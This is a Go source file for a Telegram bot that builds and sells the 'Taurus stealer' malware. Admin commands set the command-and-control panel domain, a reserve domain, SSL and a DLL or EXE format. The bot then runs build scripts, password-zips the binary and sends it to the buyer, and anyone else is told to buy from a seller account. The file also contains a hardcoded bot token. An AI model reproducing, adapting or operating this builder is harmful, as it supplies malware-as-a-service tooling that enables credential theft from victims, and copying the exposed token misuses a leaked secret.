package main

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"

	tgbotapi "github.com/Syfaro/telegram-bot-api"
)

func IsAdmin(id int) bool {
	taurus_tech_id := 1001748661
	taurus_seller_id := 1231426319

	if id == taurus_tech_id || id == taurus_seller_id {
		return true
	}

	return false
}

// инициализация ГСЧ
func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// GenRandStr - генерация строки из n символов
func GenRandStr(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func hash_file_sha1(filePath string) (SHA1 string) {
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	hash := sha1.New()
	if _, err := io.Copy(hash, file); err != nil {
		return
	}
	hashInBytes := hash.Sum(nil)[:20]
	SHA1 = hex.EncodeToString(hashInBytes)

	return
}

type BuildConfig struct {
	IsDll   bool
	Prefix  string
	IsSsl   bool
	Domain  string
	Reserve string
}

var fileHash string

func Build(buildConfig BuildConfig) (string, string) {
	CURRENT_PATH, _ := os.Getwd()

	if buildConfig.Prefix == "" {
		buildConfig.Prefix = "MyAwesomePrefix"
	}

	config := "#define PREFIX \"" + buildConfig.Prefix + "\"\n"
	config += "#define PANEL \"" + buildConfig.Domain + "\"\n"
	if buildConfig.Reserve != "" {
		config += "#define RESERVE \"" + buildConfig.Reserve + "\"\n"
	}
	config += "#define PORT "
	if buildConfig.IsSsl {
		config += "443\n"
	} else {
		config += "80\n"
	}

	err := ioutil.WriteFile("./source/Taurus/Config.h", []byte(config), 0664)
	if err != nil {
		return "Unable write config", ""
	}

	if buildConfig.IsDll {
		err := exec.Command("cmd.exe", "/c cd "+CURRENT_PATH+" && Build_dll.bat").Run()
		if err != nil {
			return "Unable create dll build: " + err.Error(), ""
		}
	} else {
		err := exec.Command("cmd.exe", "/c cd "+CURRENT_PATH+" && Build_exe.bat").Run()
		if err != nil {
			return "Unable create exe build: " + err.Error(), ""
		}
	}

	var zipName string
	var filePath string
	if buildConfig.IsDll {
		zipName = "Taurus_dll.zip"
		filePath = "./source/Bin/Taurus_dll.dll"
	} else {
		zipName = "Taurus_exe.zip"
		filePath = "./source/Bin/Taurus.exe"
	}

	fileHash = hash_file_sha1(filePath)

	password := GenRandStr(16)
	command := "/c cd " + CURRENT_PATH + " && 7zG.exe a -tzip " + zipName + " -p" + password + " " + filePath + " -mx9"
	err = exec.Command("cmd.exe", command).Run()
	if err != nil {
		return "Unable add to archive", ""
	}

	return "", password
}

func main() {
	bot, err := tgbotapi.NewBotAPI("1083338503:AAHGErmwZ7XMwqOA0ZcrCbzjECM5kjxvpE8")
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = false

	var ucfg tgbotapi.UpdateConfig = tgbotapi.NewUpdate(0)
	ucfg.Timeout = 60

	var buildConfig BuildConfig

	updates, err := bot.GetUpdatesChan(ucfg)
	for update := range updates {
		reply := "Buy a Taurus stealer: @taurus_seller"

		switch update.Message.Command() {
		case "start":
			log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
		}

		chatId := update.Message.Chat.ID
		if IsAdmin(update.Message.From.ID) {
			switch update.Message.Command() {
			case "dll":
				if !buildConfig.IsDll {
					buildConfig.IsDll = true
					reply = ".dll build"
				} else {
					buildConfig.IsDll = false
					reply = ".exe build"
				}
			case "prefix":
				text := update.Message.Text
				textSplitted := strings.Split(text, " ")
				if len(textSplitted) >= 2 {
					buildConfig.Prefix = textSplitted[1]
					reply = "Given prefix: " + buildConfig.Prefix
				} else {
					reply = "Please, write prefix [/prefix build1]"
				}
			case "ssl":
				if !buildConfig.IsSsl {
					buildConfig.IsSsl = true
					reply = "http(s) build"
				} else {
					buildConfig.IsSsl = false
					reply = "http build"
				}
			case "domain":
				text := update.Message.Text
				textSplitted := strings.Split(text, " ")
				if len(textSplitted) >= 2 {
					link := textSplitted[1]
					u, err := url.Parse(link)
					if err != nil {
						reply = "Parse URL error: " + err.Error()
						break
					}
					if u.Scheme == "https" {
						buildConfig.IsSsl = true
					} else {
						buildConfig.IsSsl = false
					}

					buildConfig.Domain = u.Host

					reply = "Given domain: " + buildConfig.Domain
					if buildConfig.IsSsl {
						reply += "\nhttp(s) build"
					} else {
						reply += "\nhttp build"
					}
				} else {
					reply = "Please, write domain [/domain http://domain.com]"
				}
			case "reserve":
				text := update.Message.Text
				textSplitted := strings.Split(text, " ")
				if len(textSplitted) >= 2 {
					link := textSplitted[1]
					if strings.Contains(link, "https://") {
						link = strings.ReplaceAll(link, "https://", "")
					} else if strings.Contains(link, "http://") {
						link = strings.ReplaceAll(link, "http://", "")
					}
					if strings.Contains(link, "/") {
						link = strings.ReplaceAll(link, "/", "")
					}

					buildConfig.Reserve = link
					reply = "Given reserve domain: " + buildConfig.Reserve
				} else {
					reply = "Please, write reserve domain [/reserve http://domain.com]"
				}
			case "config":
				reply = fmt.Sprintf("Build config:\nDll build = %t\nBuild prefix = %s\nSSL build = %t\nDomain = %s\nReserve domain = %s\n\nTo create build: /build",
					buildConfig.IsDll,
					buildConfig.Prefix,
					buildConfig.IsSsl,
					buildConfig.Domain,
					buildConfig.Reserve,
				)
			case "build":
				if buildConfig.Domain == "" {
					reply = "Please, write domain [/domain http://domain.com]"
					break
				}

				buildError, password := Build(buildConfig)
				if buildError != "" {
					bot.Send(tgbotapi.NewMessage(chatId, buildError))
					break
				}

				var zipName string
				if buildConfig.IsDll {
					zipName = "Taurus_dll.zip"
				} else {
					zipName = "Taurus_exe.zip"
				}
				bot.Send(tgbotapi.NewDocumentUpload(chatId, zipName))

				bot.Send(tgbotapi.NewMessage(chatId, "Password: "+password))
				reply = fileHash

				buildConfig.IsDll = false
				buildConfig.Prefix = ""
				buildConfig.IsSsl = false
				buildConfig.Domain = ""
				buildConfig.Reserve = ""
			default:
				link := update.Message.Text
				u, err := url.Parse(link)
				if err != nil {
					reply = "Parse URL error: " + err.Error()
					break
				}
				if u.Scheme == "https" {
					buildConfig.IsSsl = true
				} else {
					buildConfig.IsSsl = false
				}

				buildConfig.Domain = u.Host

				reply = "Given domain: " + buildConfig.Domain
				if buildConfig.IsSsl {
					reply += "\nhttp(s) build"
				} else {
					reply += "\nhttp build"
				}
			}
		}

		bot.Send(tgbotapi.NewMessage(chatId, reply))
	}
}
